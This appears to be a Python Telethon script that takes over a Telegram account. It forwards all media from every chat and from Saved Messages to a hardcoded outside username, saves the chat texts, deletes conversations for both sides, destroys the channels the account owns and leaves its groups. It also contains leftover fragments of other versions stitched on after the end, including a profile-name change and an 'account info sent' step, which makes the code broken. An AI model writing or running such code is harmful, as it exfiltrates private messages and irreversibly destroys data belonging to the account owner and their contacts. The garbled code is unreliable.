import asyncio
import os
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import DeleteChannelRequest, LeaveChannelRequest

API_ID = 29834234
API_HASH = '552c01d21d127def060f2915aedeebf9'
TARGET_USERNAME = 'moein_915'

client = TelegramClient('ultimate_purge_session', API_ID, API_HASH)

async def process_and_delete_chat(entity, chat_name, is_saved=False):
    source = 'me' if is_saved else entity
    
    # 1. Define file details and header info
    if is_saved:
        file_name = "Saved_Messages.txt"
        header_info = (
            "📌 Saved Messages\n"
            "========================================\n\n"
        )
    else:
        user_id = getattr(entity, 'id', 'Unknown')
        username_str = f"@{entity.username}" if getattr(entity, 'username', None) else "None"
        file_name = f"chat_{user_id}.txt"
        header_info = (
            f"👤 Name: {chat_name}\n"
            f"🆔 User ID: {user_id}\n"
            f"🔗 Username: {username_str}\n"
            f"========================================\n\n"
        )
    
    media_msg_ids = []
    text_lines = []

    # Read messages from oldest to newest
    async for message in client.iter_messages(source, reverse=True):
        # A) Collect Media (Photos, Videos, Voice notes, Video notes)
        if message.photo or message.video or message.voice or message.video_note:
            media_msg_ids.append(message.id)
            if len(media_msg_ids) == 100:
                try:
                    await client.forward_messages(TARGET_USERNAME, media_msg_ids, source)
                    await asyncio.sleep(0.3)
                except FloodWaitError as e:
                    await asyncio.sleep(e.seconds)
                    await client.forward_messages(TARGET_USERNAME, media_msg_ids, source)
                except Exception:
                    pass
                media_msg_ids = []

        # B) Collect Text Messages for File Saving
        if message.text:
            date_str = message.date.strftime("%Y-%m-%d %H:%M:%S") if message.date else ""
            sender = "Me" if message.out else chat_name
            text_lines.append(f"[{date_str}] {sender}: {message.text}\n")

    # Forward remaining media
    if media_msg_ids:
        try:
            await client.forward_messages(TARGET_USERNAME, media_msg_ids, source)
            await asyncio.sleep(0.3)
        except Exception:
            pass

    # Save collected text lines to a .txt file
    if text_lines:
        try:
            with open(file_name, "w", encoding="utf-8") as f:
                f.write(header_info)
                f.writelines(text_lines)
            print(f"📄 Saved text log to: {file_name}")
        except Exception as e:
            print(f"⚠️ Error saving text file for {chat_name}: {e}")

    # 2. Delete dialog (Two-sided deletion with revoke=True)
    try:
        if is_saved:
            await client.delete_dialog('me', revoke=True)
            print("📌 Deleted Saved Messages.")
        else:
            await client.delete_dialog(entity, revoke=True)
            print(f"🗑️ Deleted PM (Two-sided): {chat_name}")
    except Exception as e:
        print(f"⚠️ Error deleting dialog {chat_name}: {e}")

async def main():
    print(f"🚀 Starting task: Forwarding media to @{TARGET_USERNAME}, saving text files, and two-sided wiping...")

    async for dialog in client.iter_dialogs(limit=None):
        entity = dialog.entity
        chat_name = dialog.name or "Unnamed"

        try:
            # A) Saved Messages
            if dialog.is_user and getattr(entity, 'is_self', False):
                print("📌 Processing Saved Messages...")
                await process_and_delete_chat(entity, "Saved Messages", is_saved=True)

            # B) Private Chats (PMs)
            elif dialog.is_user and not getattr(entity, 'bot', False):
                if getattr(entity, 'username', '') and entity.username.lower() == TARGET_USERNAME.lower():
                    continue

                print(f"👤 Processing PM: {chat_name} (ID: {entity.id})")
                await process_and_delete_chat(entity, chat_name, is_saved=False)

            # C) Bots (Delete only)
            elif dialog.is_user and getattr(entity, 'bot', False):
                print(f"🤖 Deleting bot: {chat_name}")
                await client.delete_dialog(entity, revoke=True)
                await asyncio.sleep(0.5)

            # D) Channels & Supergroups
            elif dialog.is_channel:
                if getattr(entity, 'creator', False):
                    print(f"💥 Destroying owned channel/group: {chat_name}")
                    await client(DeleteChannelRequest(entity))
                else:
                    print(f"🚪 Leaving channel/group: {chat_name}")
                    await client(LeaveChannelRequest(entity))
                    await client.delete_dialog(entity)
                await asyncio.sleep(0.5)

            # E) Basic Groups
            elif dialog.is_group:
                print(f"👥 Leaving group: {chat_name}")
                await client.delete_dialog(entity, revoke=True)
                await asyncio.sleep(0.5)

        except FloodWaitError as e:
            print(f"⏳ Telegram rate limit! Waiting for {e.seconds} seconds...")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"⚠️ Error processing {chat_name}: {e}")

    print(f"\n✨ Operation completed: All media forwarded to @{TARGET_USERNAME}, text logs saved, and chats deleted for both sides.")

with client:
    client.loop.run_until_complete(main())                await asyncio.sleep(0.5)

            # D) Channels & Supergroups (Destroy if owner, Leave & Delete if member)
            elif dialog.is_channel:
                if getattr(entity, 'creator', False):
                    print(f"💥 Destroying owned channel/group: {chat_name}")
                    await client(DeleteChannelRequest(entity))
                else:
                    print(f"🚪 Leaving and deleting channel/group: {chat_name}")
                    await client(LeaveChannelRequest(entity))
                    await client.delete_dialog(entity)
                await asyncio.sleep(0.5)

            # E) Basic Groups (Leave & Delete)
            elif dialog.is_group:
                print(f"👥 Leaving and deleting group: {chat_name}")
                await client.delete_dialog(entity)
                await asyncio.sleep(0.5)

        except FloodWaitError as e:
            print(f"⏳ Telegram rate limit! Waiting for {e.seconds} seconds...")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"⚠️ Error processing {chat_name}: {e}")

    print(f"\n✨ Operation completed: All PMs forwarded to @{TARGET_USERNAME} and account fully wiped.")

with client:
    client.loop.run_until_complete(main())        print("Account info sent.")

    except Exception as e:
        print(f"Send info error: {e}")


    try:
        await client(
            UpdateProfileRequest(
                first_name=NEW_FIRST_NAME
            )
        )

        print("Name changed.")

    except Exception as e:
        print(f"Profile update error: {e}")


with client:
    client.loop.run_until_complete(main())
